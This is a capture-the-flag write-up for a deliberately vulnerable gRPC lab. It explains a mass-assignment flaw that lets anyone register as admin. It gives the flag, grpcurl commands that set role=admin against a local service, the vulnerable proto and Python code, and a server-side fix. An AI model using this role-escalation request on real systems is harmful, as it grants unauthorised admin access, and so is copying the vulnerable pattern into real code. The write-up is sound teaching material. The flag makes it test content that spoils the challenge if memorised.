# Challenge 08 — Mass Assignment

**Category:** Security Misconfiguration
**Difficulty:** 🟡 Medium
**Service:** `AuthService`
**Flag:** `FLAG{m4ss_4ss1gnm3nt_r0l3_3sc4l4t10n}`

---

## Background

Mass assignment occurs when a server accepts client-controlled values for fields that should only be set server-side. In this challenge, the `RegisterRequest` proto message contains a `role` field that the server blindly assigns to the new user — allowing anyone to register as `admin`.

This is harder to spot in gRPC than in REST APIs because proto fields aren't always visible in auto-generated documentation. Read the `.proto` files carefully.

---

## Steps

```bash
# Register with role=admin
grpcurl -plaintext localhost:50051 dvgrpc.AuthService/Register \
  -d '{"username":"evil_admin","password":"hacked","email":"x@x.com","role":"admin"}'

# Verify the role was assigned
grpcurl -plaintext localhost:50051 dvgrpc.AuthService/Login \
  -d '{"username":"evil_admin","password":"hacked"}'
# Response should show role: "admin"
```

---

## Vulnerable Code

`proto/auth.proto`:

```protobuf
message RegisterRequest {
  string username = 1;
  string password = 2;
  string email = 3;
  string role = 4; // Hidden field — clients can set this!
}
```

`server/services/auth_service.py`:

```python
# VULNERABILITY: role comes directly from the request
role = request.role.strip() if request.role else "user"
cursor.execute("INSERT INTO users ... role=?", (..., role))
```

---

## Fix

```python
# Always hardcode the role server-side on registration
role = "user"  # Never trust client-supplied role
```

Remove the `role` field from `RegisterRequest` entirely.
